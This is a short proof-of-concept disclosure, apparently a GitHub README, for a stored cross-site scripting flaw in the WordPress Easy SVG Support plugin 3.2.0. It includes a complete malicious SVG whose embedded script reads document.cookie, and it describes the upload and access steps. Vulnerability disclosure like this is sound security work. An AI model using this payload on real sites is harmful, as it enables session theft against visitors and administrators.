# Cross Site Scripting Though SVG Files in Easy SVG Support Wordpress Plugin

This PoC describe how to exploit a Cross-Site Scripting (XSS) in - Wordpress Easy SVG Support version 3.2.0

# Description

The Easy SVG Support v3.2.0, plugin for Wordpress does not sanitize the SVG Files, so it is possible to upload a malicious SVG File to get a XSS.

![3](https://user-images.githubusercontent.com/70114276/165981178-debf89c7-9bc8-42ab-837b-51522856b98a.png)

## Attack Scenario

First we create our SVG file with this content:

![3](https://user-images.githubusercontent.com/70114276/165981536-9ee8b054-0275-4268-83c1-160039432cb2.png)

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400" />
<script type="text/javascript">
alert(document.cookie);
</script>
</svg>
```

Then we upload the file to WordPress

![4](https://user-images.githubusercontent.com/70114276/165983121-21ad9ce7-b823-4d87-b8b2-40d1978ee31e.png)

To validate the PoC, simply access the directory where the file was sent.

![5](https://user-images.githubusercontent.com/70114276/165983131-acb04469-b4d4-4eb1-985c-cea6cc4bc476.png)
